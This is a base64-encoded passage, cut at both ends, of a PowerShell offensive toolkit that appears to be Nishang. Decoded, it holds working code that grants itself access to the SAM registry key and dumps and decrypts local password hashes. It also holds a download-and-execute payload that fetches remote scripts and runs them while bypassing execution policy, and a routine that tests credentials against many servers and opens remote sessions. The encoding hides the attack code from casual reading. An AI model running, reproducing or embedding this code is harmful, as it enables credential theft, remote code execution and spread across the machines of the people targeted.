ZW5LZXlFeCgkbmtleSwkc3Via2V5LDAsJEtFWVJFQUQsW3JlZl0kaGtleSkpCiAgICB7CiAgICAJJGNsYXNzVmFsID0gTmV3LU9iamVjdCBUZXh0LlN0cmluZ2J1aWxkZXIgMTAyNAogICAgCVtpbnRdJGxlbiA9IDEwMjQKICAgIAlpZiAoLW5vdCBbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ1F1ZXJ5SW5mb0tleSgkaGtleSwkY2xhc3NWYWwsW3JlZl0kbGVuLDAsW3JlZl0kbnVsbCxbcmVmXSRudWxsLAogICAgCQlbcmVmXSRudWxsLFtyZWZdJG51bGwsW3JlZl0kbnVsbCxbcmVmXSRudWxsLFtyZWZdJG51bGwsMCkpCiAgICAJewogICAgCQkkcmVzdWx0ID0gJGNsYXNzVmFsLlRvU3RyaW5nKCkKICAgIAl9CiAgICAJZWxzZQogICAgCXsKICAgIAkJV3JpdGUtRXJyb3IgIlJlZ1F1ZXJ5SW5mb0tleSBmYWlsZWQiOwogICAgCX0KICAgIAlbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ0Nsb3NlS2V5KCRoa2V5KSB8IE91dC1OdWxsCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAJV3JpdGUtRXJyb3IgIkNhbm5vdCBvcGVuIGtleSI7CiAgICB9CiAgICByZXR1cm4gJHJlc3VsdDsKfQoKZnVuY3Rpb24gR2V0LUJvb3RLZXkKewogICAgJHMgPSBbc3RyaW5nXTo6Sm9pbigiIiwkKCJKRCIsIlNrZXcxIiwiR0JHIiwiRGF0YSIgfCAle0dldC1SZWdLZXlDbGFzcyAiSEtMTSIgIlNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXExzYVwkXyJ9KSk7CiAgICAkYiA9IG5ldy1vYmplY3QgYnl0ZVtdICQoJHMuTGVuZ3RoLzIpOwogICAgMC4uJCgkYi5MZW5ndGgtMSkgfCAleyRiWyRfXSA9IFtDb252ZXJ0XTo6VG9CeXRlKCRzLlN1YnN0cmluZygkKCRfKjIpLDIpLDE2KX0KICAgICRiMiA9IG5ldy1vYmplY3QgYnl0ZVtdIDE2OwogICAgMHg4LCAweDUsIDB4NCwgMHgyLCAweGIsIDB4OSwgMHhkLCAweDMsIDB4MCwgMHg2LCAweDEsIDB4YywgMHhlLCAweGEsIDB4ZiwgMHg3IHwgJSAtYmVnaW57JGk9MDt9eyRiMlskaV09JGJbJF9dOyRpKyt9CiAgICByZXR1cm4gLCRiMjsKfQoKZnVuY3Rpb24gR2V0LUhCb290S2V5CnsKICAgIHBhcmFtKFtieXRlW11dJGJvb3RrZXkpOwogICAgJGFxd2VydHkgPSBbVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCIhQCMkJV4mKigpcXdlcnR5VUlPUEF6eGN2Ym5tUVFRUVFRUVFRUVFRKSgqQCYlYDAiKTsKICAgICRhbnVtID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiMDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OWAwIik7CiAgICAkayA9IEdldC1JdGVtIEhLTE06XFNBTVxTQU1cRG9tYWluc1xBY2NvdW50OwogICAgaWYgKC1ub3QgJGspIHtyZXR1cm4gJG51bGx9CiAgICBbYnl0ZVtdXSRGID0gJGsuR2V0VmFsdWUoIkYiKTsKICAgIGlmICgtbm90ICRGKSB7cmV0dXJuICRudWxsfQogICAgJHJjNGtleSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1XTo6Q3JlYXRlKCkuQ29tcHV0ZUhhc2goJEZbMHg3MC4uMHg3Rl0gKyAkYXF3ZXJ0eSArICRib290a2V5ICsgJGFudW0pOwogICAgJHJjNCA9IE5ld1JDNCAkcmM0a2V5OwogICAgcmV0dXJuICwoJHJjNC5lbmNyeXB0KCRGWzB4ODAuLjB4OUZdKSk7Cn0KCmZ1bmN0aW9uIEdldC1Vc2VyTmFtZShbYnl0ZVtdXSRWKQp7CiAgICBpZiAoLW5vdCAkVikge3JldHVybiAkbnVsbH07CiAgICAkb2Zmc2V0ID0gW0JpdENvbnZlcnRlcl06OlRvSW50MzIoJFZbMHgwYy4uMHgwZl0sMCkgKyAweENDOwogICAgJGxlbiA9IFtCaXRDb252ZXJ0ZXJdOjpUb0ludDMyKCRWWzB4MTAuLjB4MTNdLDApOwogICAgcmV0dXJuIFtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJFYsICRvZmZzZXQsICRsZW4pOwp9CgpmdW5jdGlvbiBHZXQtVXNlckhhc2hlcygkdSwgW2J5dGVbXV0kaGJvb3RrZXkpCnsKICAgIFtieXRlW11dJGVuY19sbV9oYXNoID0gJG51bGw7IFtieXRlW11dJGVuY19udF9oYXNoID0gJG51bGw7CiAgICAKICAgICMgY2hlY2sgaWYgaGFzaGVzIGV4aXN0IChpZiBieXRlIG1lbW9yeSBlcXVhbHMgdG8gMjAsIHRoZW4gd2UndmUgZ290IGEgaGFzaCkKICAgICRMTV9leGlzdHMgPSAkZmFsc2U7CiAgICAkTlRfZXhpc3RzID0gJGZhbHNlOwogICAgIyBMTSBoZWFkZXIgY2hlY2sKICAgIGlmICgkdS5WWzB4YTAuLjB4YTNdIC1lcSAyMCkKICAgIHsKICAgICAgICAkTE1fZXhpc3RzID0gJHRydWU7CiAgICB9CiAgICAjIE5UIGhlYWRlciBjaGVjawogICAgZWxzZWlmICgkdS5WWzB4YWMuLjB4YWZdIC1lcSAyMCkKICAgIHsKICAgICAgICAkTlRfZXhpc3RzID0gJHRydWU7CiAgICB9CgogICAgaWYgKCRMTV9leGlzdHMgLWVxICR0cnVlKQogICAgewogICAgICAgICRsbV9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA0OwogICAgICAgICRudF9oYXNoX29mZnNldCA9ICR1Lkhhc2hPZmZzZXQgKyA4ICsgMHgxMDsKICAgICAgICAkZW5jX2xtX2hhc2ggPSAkdS5WWyQoJGxtX2hhc2hfb2Zmc2V0KS4uJCgkbG1faGFzaF9vZmZzZXQrMHgwZildOwogICAgICAgICRlbmNfbnRfaGFzaCA9ICR1LlZbJCgkbnRfaGFzaF9vZmZzZXQpLi4kKCRudF9oYXNoX29mZnNldCsweDBmKV07CiAgICB9CgkKICAgIGVsc2VpZiAoJE5UX2V4aXN0cyAtZXEgJHRydWUpCiAgICB7CiAgICAgICAgJG50X2hhc2hfb2Zmc2V0ID0gJHUuSGFzaE9mZnNldCArIDg7CiAgICAgICAgJGVuY19udF9oYXNoID0gW2J5dGVbXV0kdS5WWyQoJG50X2hhc2hfb2Zmc2V0KS4uJCgkbnRfaGFzaF9vZmZzZXQrMHgwZildOwogICAgfQogICAgcmV0dXJuICwoRGVjcnlwdEhhc2hlcyAkdS5SaWQgJGVuY19sbV9oYXNoICRlbmNfbnRfaGFzaCAkaGJvb3RrZXkpOwp9CgpmdW5jdGlvbiBEZWNyeXB0SGFzaGVzKCRyaWQsIFtieXRlW11dJGVuY19sbV9oYXNoLCBbYnl0ZVtdXSRlbmNfbnRfaGFzaCwgW2J5dGVbXV0kaGJvb3RrZXkpCnsKICAgIFtieXRlW11dJGxtaGFzaCA9ICRlbXB0eV9sbTsgW2J5dGVbXV0kbnRoYXNoPSRlbXB0eV9udDsKICAgICMgTE0gSGFzaAogICAgaWYgKCRlbmNfbG1faGFzaCkKICAgIHsKICAgICAgICAkbG1oYXNoID0gRGVjcnlwdFNpbmdsZUhhc2ggJHJpZCAkaGJvb3RrZXkgJGVuY19sbV9oYXNoICRhbG1wYXNzd29yZDsKICAgIH0KCiAgICAjIE5UIEhhc2gKICAgIGlmICgkZW5jX250X2hhc2gpCiAgICB7CiAgICAgICAgJG50aGFzaCA9IERlY3J5cHRTaW5nbGVIYXNoICRyaWQgJGhib290a2V5ICRlbmNfbnRfaGFzaCAkYW50cGFzc3dvcmQ7CiAgICB9CgogICAgcmV0dXJuICwoJGxtaGFzaCwkbnRoYXNoKQp9CgpmdW5jdGlvbiBEZWNyeXB0U2luZ2xlSGFzaCgkcmlkLFtieXRlW11dJGhib290a2V5LFtieXRlW11dJGVuY19oYXNoLFtieXRlW11dJGxtbnRzdHIpCnsKICAgICRkZXNrZXlzID0gc2lkX3RvX2tleSAkcmlkOwogICAgJG1kNSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1XTo6Q3JlYXRlKCk7CiAgICAkcmM0X2tleSA9ICRtZDUuQ29tcHV0ZUhhc2goJGhib290a2V5WzAuLjB4MGZdICsgW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRyaWQpICsgJGxtbnRzdHIpOwogICAgJHJjNCA9IE5ld1JDNCAkcmM0X2tleTsKICAgICRvYmZrZXkgPSAkcmM0LmVuY3J5cHQoJGVuY19oYXNoKTsKICAgICRoYXNoID0gKGRlc19kZWNyeXB0ICAkb2Jma2V5WzAuLjddICRkZXNrZXlzWzBdKSArCiAgICAgICAgKGRlc19kZWNyeXB0ICRvYmZrZXlbOC4uJCgkb2Jma2V5Lkxlbmd0aCAtIDEpXSAkZGVza2V5c1sxXSk7CiAgICByZXR1cm4gLCRoYXNoOwp9CgpmdW5jdGlvbiBHZXQtVXNlcktleXMKewogICAgbHMgSEtMTTpcU0FNXFNBTVxEb21haW5zXEFjY291bnRcVXNlcnMgfAogICAgICAgIHdoZXJlIHskXy5QU0NoaWxkTmFtZSAtbWF0Y2ggIl5bMC05QS1GYS1mXXs4fSQifSB8CiAgICAgICAgICAgIEFkZC1NZW1iZXIgQWxpYXNQcm9wZXJ0eSBLZXlOYW1lIFBTQ2hpbGROYW1lIC1QYXNzVGhydSB8CiAgICAgICAgICAgIEFkZC1NZW1iZXIgU2NyaXB0UHJvcGVydHkgUmlkIHtbQ29udmVydF06OlRvSW50MzIoJHRoaXMuUFNDaGlsZE5hbWUsIDE2KX0gLVBhc3NUaHJ1IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBTY3JpcHRQcm9wZXJ0eSBWIHtbYnl0ZVtdXSgkdGhpcy5HZXRWYWx1ZSgiViIpKX0gLVBhc3NUaHJ1IHwKICAgICAgICAgICAgQWRkLU1lbWJlciBTY3JpcHRQcm9wZXJ0eSBVc2VyTmFtZSB7R2V0LVVzZXJOYW1lKCR0aGlzLkdldFZhbHVlKCJWIikpfSAtUGFzc1RocnUgfAogICAgICAgICAgICBBZGQtTWVtYmVyIFNjcmlwdFByb3BlcnR5IEhhc2hPZmZzZXQge1tCaXRDb252ZXJ0ZXJdOjpUb1VJbnQzMigkdGhpcy5HZXRWYWx1ZSgiViIpWzB4OWMuLjB4OWZdLDApICsgMHhDQ30gLVBhc3NUaHJ1Cn0KCmZ1bmN0aW9uIER1bXBIYXNoZXMKewogICAgTG9hZEFwaQogICAgJGJvb3RrZXkgPSBHZXQtQm9vdEtleTsKICAgICRoYm9vdEtleSA9IEdldC1IQm9vdEtleSAkYm9vdGtleTsKICAgIEdldC1Vc2VyS2V5cyB8ICV7CiAgICAgICAgJGhhc2hlcyA9IEdldC1Vc2VySGFzaGVzICRfICRoQm9vdEtleTsKICAgICAgICAiezB9OnsxfTp7Mn06ezN9Ojo6IiAtZiAoJF8uVXNlck5hbWUsJF8uUmlkLAogICAgICAgICAgICBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJGhhc2hlc1swXSkuUmVwbGFjZSgiLSIsIiIpLlRvTG93ZXIoKSwKICAgICAgICAgICAgW0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRoYXNoZXNbMV0pLlJlcGxhY2UoIi0iLCIiKS5Ub0xvd2VyKCkpOwogICAgfQp9CgogICAgI2h0dHA6Ly93d3cubGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLzIwMTMvMDUvcG9zaGluZy1oYXNoZXMtcGFydC0yLmh0bWw/c2hvd0NvbW1lbnQ9MTM4NjcyNTg3NDE2NyNjODUxMzk4MDcyNTgyMzc2NDA2MAogICAgaWYgKC1OT1QgKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdICJBZG1pbmlzdHJhdG9yIikpCiAgICB7CiAgICAgICAgV3JpdGUtV2FybmluZyAiU2NyaXB0IHJlcXVpcmVzIGVsZXZhdGVkIG9yIGFkbWluaXN0cmF0aXZlIHByaXZpbGVnZXMuIgogICAgICAgIFJldHVybgogICAgfSAKICAgIGVsc2UKICAgIHsKICAgICAgICAjU2V0IHBlcm1pc3Npb25zIGZvciB0aGUgY3VycmVudCB1c2VyLgogICAgICAgICRydWxlID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SZWdpc3RyeUFjY2Vzc1J1bGUgKAogICAgICAgIFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKS5OYW1lLAogICAgICAgICJGdWxsQ29udHJvbCIsCiAgICAgICAgW1N5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLkluaGVyaXRhbmNlRmxhZ3NdIk9iamVjdEluaGVyaXQsQ29udGFpbmVySW5oZXJpdCIsCiAgICAgICAgW1N5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLlByb3BhZ2F0aW9uRmxhZ3NdIk5vbmUiLAogICAgICAgIFtTeXN0ZW0uU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5BY2Nlc3NDb250cm9sVHlwZV0iQWxsb3ciKQogICAgICAgICRrZXkgPSBbTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5XTo6TG9jYWxNYWNoaW5lLk9wZW5TdWJLZXkoCiAgICAgICAgIlNBTVxTQU1cRG9tYWlucyIsCiAgICAgICAgW01pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeUtleVBlcm1pc3Npb25DaGVja106OlJlYWRXcml0ZVN1YlRyZWUsCiAgICAgICAgW1N5c3RlbS5TZWN1cml0eS5BY2Nlc3NDb250cm9sLlJlZ2lzdHJ5UmlnaHRzXTo6Q2hhbmdlUGVybWlzc2lvbnMpCiAgICAgICAgJGFjbCA9ICRrZXkuR2V0QWNjZXNzQ29udHJvbCgpCiAgICAgICAgJGFjbC5TZXRBY2Nlc3NSdWxlKCRydWxlKQogICAgICAgICRrZXkuU2V0QWNjZXNzQ29udHJvbCgkYWNsKQoKICAgICAgICBEdW1wSGFzaGVzCgogICAgICAgICNSZW1vdmUgdGhlIHBlcm1pc3Npb25zIGFkZGVkIGFib3ZlLgogICAgICAgICR1c2VyID0gW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUKICAgICAgICAkYWNsLkFjY2VzcyB8IHdoZXJlIHskXy5JZGVudGl0eVJlZmVyZW5jZS5WYWx1ZSAtZXEgJHVzZXJ9IHwgJXskYWNsLlJlbW92ZUFjY2Vzc1J1bGUoJF8pfSB8IE91dC1OdWxsCiAgICAgICAgU2V0LUFjbCBIS0xNOlxTQU1cU0FNXERvbWFpbnMgJGFjbAoKICAgIH0KfQoKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNEb3dubG9hZCBhbmQgRXhlY3V0ZSBhIHBvd2Vyc2hlbGwgc2NyaXB0IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgoKCmZ1bmN0aW9uIERvd25sb2FkLUV4ZWN1dGUtUFMKewo8IwouU1lOT1BTSVMKTmlzaGFuZyBzY3JpcHQgd2hpY2ggZG93bmxvYWRzIGFuZCBleGVjdXRlcyBhIHBvd2Vyc2hlbGwgc2NyaXB0LgoKLkRFU0NSSVBUSU9OClRoaXMgcGF5bG9hZCBkb3dubG9hZHMgYSBwb3dlcnNoZWxsIHNjcmlwdCBmcm9tIHNwZWNpZmllZCBVUkwgYW5kIHRoZW4gZXhlY3V0ZXMgaXQgb24gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgU2NyaXB0VVJMClRoZSBVUkwgZnJvbSB3aGVyZSB0aGUgcG93ZXJzaGVsbCBzY3JpcHQgd291bGQgYmUgZG93bmxvYWRlZC4KCi5QQVJBTUVURVIgQXJndW1lbnRzClRoZSBBcmd1bWVudHMgdG8gcGFzcyB0byB0aGUgc2NyaXB0IHdoZW4gaXQgaXMgbm90IGRvd25sb2FkZWQgdG8gZGlzayBpLmUuIHdpdGggLW5vZG93bmxvYWQgZnVuY3Rpb24uClRoaXMgaXMgdG8gYmUgdXNlZCB3aGVuIHRoZSBzY3JpcHRzIGxvYWQgYSBmdW5jdGlvbiBpbiBtZW1vcnksIHRydWUgZm9yIG1vc3Qgc2NyaXB0cyBpbiBOaXNoYW5nLgoKLlBBUkFNRVRFUiBOb2Rvd25sb2FkCklmIHRoaXMgc3dpdGNoIGlzIHVzZWQsIHRoZSBzY3JpcHQgaXMgbm90IGRvd2xvYWRlZCB0byB0aGUgZGlzay4KCi5FWEFNUExFClBTID4gRG93bmxvYWQtRXhlY3V0ZS1QUyBodHRwOi8vcGFzdGViaW4uY29tL3Jhdy5waHA/aT1qcVAydkozeAoKLkVYQU1QTEUKUFMgPiBEb3dubG9hZC1FeGVjdXRlLVBTIGh0dHA6Ly9zY3JpcHQuYWx0ZXJlZHNlY3VyaXR5LmNvbS9ldmlsc2NyaXB0LnBzMSAtQXJndW1lbnQgZXZpbHNjcmlwdCAtbm9kb3dubG9hZApUaGUgYWJvdmUgY29tbWFuZCBkb2VzIG5vdCBkb3dubG9hZCB0aGUgc2NyaXB0IGZpbGUgdG8gZGlzayBhbmQgZXhlY3V0ZXMgdGhlIGV2aWxzY3JpcHQgZnVuY3Rpb24gaW5zaWRlIHRoZSBldmlsc2NyaXB0LnBzMQoKLkxJTksKaHR0cDovL2xhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8KaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4KICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2NyaXB0VVJMLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRBcmd1bWVudHMsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJG5vZG93bmxvYWQKICAgICkKCiAgICBpZiAoJG5vZG93bmxvYWQgLWVxICR0cnVlKQogICAgewogICAgICAgIEludm9rZS1FeHByZXNzaW9uICgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygiJFNjcmlwdFVSTCIpKQogICAgICAgIGlmKCRBcmd1bWVudHMpCiAgICAgICAgewogICAgICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAkQXJndW1lbnRzCiAgICAgICAgfQogICAgfQogICAgCiAgICBlbHNlCiAgICB7CiAgICAgICAgJHdlYmNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICAgICAkZmlsZTEgPSAiJGVudjp0ZW1wXGRlcHMucHMxIgogICAgICAgICR3ZWJjbGllbnQuRG93bmxvYWRGaWxlKCRTY3JpcHRVUkwsIiRmaWxlMSIpCiAgICAgICAgJHNjcmlwdDpwYXN0ZXZhbHVlID0gcG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLW5vTG9nbyAtY29tbWFuZCAkZmlsZTEKICAgICAgICAkcGFzdGV2YWx1ZQogICAgfQp9CgoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNDaGVjayBjcmVkZW50aWFscyBvbiByZW1vdGUgY29tcHV0ZXJzIGFuZCBjcmVhdGUgc2Vzc2lvbnMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIENyZWF0ZS1NdWx0aXBsZVNlc3Npb25zCnsKICAgIAo8IwouU1lOT1BTSVMKRnVuY3Rpb24gd2hpY2ggY2FuIGNoZWNrIGZvciBjcmVkZW50aWFscyBvbiByZW1vdGUgY29tcHV0ZXJzIGFuZCBjYW4gb3BlbiBQU1Nlc3Npb25zIGlmIHRoZSBjcmVkZW50aWFscyB3b3JrLgoKLkRFU0NSSVBUSU9OClRoZSBwYXlsb2FkIHVzZXMgV01JIHRvIGNoZWNrIGEgY3JlZGVudGlhbCBhZ2FpbnN0IGdpdmVuIGxpc3Qgb2YgY29tcHV0ZXJzLiBVc2UgdGhlIC1DcmVkcyBwYXJhbWV0ZXIgdG8gc3BlY2lmeSB1c2VybmFtZSBhbmQgcGFzc3dvcmQuIElmIHRoZSBzY3JpcHQgaXMgcnVuCmZyb20gYSBwb3dlcnNoZWxsIHNlc3Npb24gd2l0aCBsb2NhbCBvciBnbG9iYWwgYWRtaW4gY3JlZGVudGlhbHMgKG9yIGZyb20gYSBwb3dlcnNoZWxsIHNlc3Npb24gc3RhcnRlZCB3aXRoIGhhc2hlcyBvZiBzdWNoIGFjY291bnQgdXNpbmcgV0NFKSwgaXQgc2hvdWxkIGJlIHVzZWQKd2l0aG91dCB0aGUgLUNyZWRzIHBhcmFtZXRlci4gVXNlIHRoZSAtQ3JlYXRlU2Vzc2lvbnMgcGFyYW1ldGVyIHRvIGNyZWF0ZSBQU1Nlc3Npb25zLiAKCi5QQVJBTUVURVIgZmlsZW5hbWUKUGF0aCB0byB0aGUgZmlsZSB3aGljaCBzdG9yZXMgbGlzdCBvZiBzZXJ2ZXJzLgoKLlBBUkFNRVRFUiBDcmVkcwpVc2UgdGhpcyBwYXJhbWV0ZXIgdG8gc3BlY2lmeSB1c2VybmFtZSAoaW4gZm9ybSBvZiBkb21haW5cdXNlcm5hbWUpIGFuZCBwYXNzd29yZC4KCi5QQVJBTUVURVIgQ3JlYXRlU2Vzc2lvbnMKVXNlIHRoaXMgcGFyYW1ldGVyIHRvIG1ha2UgdGhlIHNjcmlwdCBjcmVhdGUgUFNTZXNzaW9ucyB0byB0YXJnZXRzIG9uIHdoaWNoIHRoZSBjcmVkZW50aWFscyB3b3JrZWQuCgouUEFSQU1FVEVSIFZlcmJvc2VFcnJvcnMKVXNlIHRoaXMgcGFyYW1ldGVyIHRvIGdldCB2ZXJib3NlIGVycm9yIG1lc3NhZ2VzLgoKLkVYQU1QTEUKUFMgPiBDcmVhdGUtTXVsdGlwbGVTZXNzaW9ucyAtZmlsZW5hbWUgLlxzZXJ2ZXJzLnR4dApBYm92ZSBjb21tYW5kIHVzZXMgdGhlIGNyZWRlbnRpYWxzIGF2YWlsYWJsZSB3aXRoIGN1cnJlbnQgcG93ZXJzaGVsbCBzZXNzaW9uIGFuZCBjaGVja3MgaXQgYWdhaW5zdCBtdWx0aXBsZSBjb21wdXRlcnMgc3BlY2lmaWVkIGluIHNlcnZlcnMudHh0CgouRVhBTVBMRQpQUyA+IENyZWF0ZS1NdWx0aXBsZVNlc3Npb25zIC1maWxlbmFtZSAuXHNlcnZlcnMudHh0IC1DcmVkcwpBYm92ZSBjb21tYW5kIGFza3MgdGhlIHVzZXIgdG8gcHJvdmlkZSB1c2VybmFtZSBhbmQgcGFzc293cmQgdG8gY2hlY2sgb24gcmVtb3RlIGNvbXB1dGVycy4KCi5FWEFNUExFClBTID4gQ3JlYXRlLU11bHRpcGxlU2Vzc2lvbnMgLWZpbGVuYW1lIC5cc2VydmVycy50eHQgLUNyZWF0ZVNlc3Npb25zCkFib3ZlIGNvbW1hbmQgdXNlcyB0aGUgY3JlZGVudGlhbHMgYXZhaWxhYmxlIHdpdGggY3VycmVudCBwb3dlcnNoZWxsIHNlc3Npb24sIGNoZWNrcyBpdCBhZ2FpbnN0IG11bHRpcGxlIGNvbXB1dGVycyBzcGVjaWZpZWQgaW4gc2VydmVycy50eHQgYW5kIGNyZWF0ZXMgUFNTZXNzaW9uIGZvciB0aG9zZS4KCi5MSU5LCmh0dHA6Ly9sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxMy8wNC9wb3NoaW5nLXRoZS1oYXNoZXMuaHRtbApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwojPgoKICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtICggCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRmaWxlbmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENyZWRzLAogICAgCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENyZWF0ZVNlc3Npb25zLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVmVyYm9zZUVycm9ycwogICAgKQogICAgJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJTaWxlbnRseUNvbnRpbnVlIgogICAgaWYgKCRWZXJib3NlRXJyb3JzKQogICAgewogICAgICAgICRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAiQ29udGludWUiCiAgICB9CiAgICAkc2VydmVycyA9IEdldC1Db250ZW50ICRmaWxlbmFtZQoKICAgIGlmICgkQ3JlZHMpCiAgICB7CiAgICAgICAgJENyZWRlbnRpYWxzID0gR2V0LUNyZWRlbnRpYWwKICAgICAgICAkQ2hlY2tDb21tYW5kID0gJ2d3bWkgLXF1ZXJ5ICJTZWxlY3QgSVBBZGRyZXNzIEZyb20gV2luMzJfTmV0d29ya0FkYXB0ZXJDb25maWd1cmF0aW9uIFdoZXJlIElQRW5hYmxlZCA9IFRydWUiIC1Db21wdXRlck5hbWUgJHNlcnZlciAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbHMnCiAgICAgICAgJFNlc3Npb25Db21tYW5kID0gJ05ldy1QU1Nlc3Npb24gLUNvbXB1dGVyTmFtZSAkc2VydmVyIC1DcmVkZW50aWFsICRDcmVkZW50aWFscycKICAgIH0KCiAgICBlbHNlCiAgICB7CiAgICAgICAgJENoZWNrQ29tbWFuZCA9ICdnd21pIC1xdWVyeSAiU2VsZWN0IElQQWRkcmVzcyBGcm9tIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiBXaGVyZSBJUEVuYWJsZWQgPSBUcnVlIiAtQ29tcHV0ZXJOYW1lICRzZXJ2ZXInCiAgICAgICAgJFNlc3Npb25Db21tYW5kID0gJ05ldy1QU1Nlc3Npb24gLUNvbXB1dGVyTmFtZSAkc2VydmVyJwogICAgfQoKICAgIGZvcmVhY2ggKCRzZXJ2ZXIgaW4gJHNlcnZlcnMpCiAgICB7CiAgICAgICAkY2hlY2sgPSBJbnZva2UtRXhwcmVzc2lvbiAkQ2hlY2tDb21tYW5kCiAgICAgICBpZigkY2hlY2sgLW5lICRudWxsKQogICAgICAgewogICAgICAgICAgIFdyaXRlLUhvc3QgIkNyZWRlbnRpYWxzIHdvcmtlZCBvbiAkc2VydmVyICEhIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCiAgICAgICAgICAgaWYgKCRDcmVhdGVTZXNzaW9ucyAtZXEgJFRydWUpCiAgICAgICAgICAgewogICAgICAgICAgICAgICAgImBuQ3JlYXRpbmcgU2Vzc2lvbiBmb3IgJHNlcnZlciIKICAgICAgICAgICAgICAgIEludm9rZS1FeHByZXNzaW9uICRTZXNzaW9uQ29tbWFuZAogICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAiQ291bGQgbm90IGNvbm5lY3Qgb3IgY3JlZGVudGlhbHMgZGlkbid0IHdvcmsgb24gJHNlcnZlciIKICAgICAgICB9CiAgICB9CiAgICAKICAgIGlmICgkQ3JlYXRlU2Vzc2lvbnMgLWVxICRUcnVlKQogICAgewogICAgV3JpdGUtSG9zdCAiYG5Gb2xsb3dpbmcgU2Vzc2lvbnMgaGF2ZSBiZWVuIGNyZWF0ZWQ6ICIgLUZvcmVncm91bmRDb2xvciBHcmVlbgogICAgR2V0LVBTU2Vzc2lvbgogICAgfQp9CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNDb3B5IFNBTSBmaWxlIHVzaW5nIFZvbHVtZSBTaGFkb3cgU2VydmljZSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCjwjCi5TWU5PUFNJUwpOaXNoYW5nIFBheWxvYWQgd2hpY2ggY29waWVzIHRoZSBTQU0gZmlsZS4KCi5ERVNDUklQVElPTgpUaGlzIHBheWxvYWQgdXNlcyB0aGUgVlNTIHNlcn